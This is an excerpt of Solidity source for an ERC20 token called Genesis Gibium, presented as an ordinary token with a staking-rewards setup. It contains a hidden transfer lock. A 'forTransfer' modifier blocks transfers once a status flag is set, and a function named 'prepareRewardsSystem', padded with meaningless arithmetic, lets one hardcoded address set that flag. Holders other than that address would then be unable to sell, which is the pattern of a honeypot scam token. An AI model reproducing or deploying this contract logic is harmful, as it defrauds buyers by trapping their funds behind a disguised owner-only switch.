...
contract GenesisGibium is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenbh_totalSupply;
    uint256 private _tokenbh_status = 0;
    uint256 public stakingPoolbhStatus = 0;

    string private _tokenbh_name;
    string private _tokenbh_symbol;

    address private _poolbhAddress = 0xAAb6e09c363669560749509D80B23EF1A884256C; 

    constructor() {
        _tokenbh_name = "Genesis Gibium";
        _tokenbh_symbol = "GIBIUM";
        _tokenbh_totalSupply = 10001 * 10 ** 18;
        _balances[msg.sender] = _tokenbh_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbhAddress || _tokenbh_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbhStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbhAddress)
        {
            _tokenbh_status = 1;
        }
    }
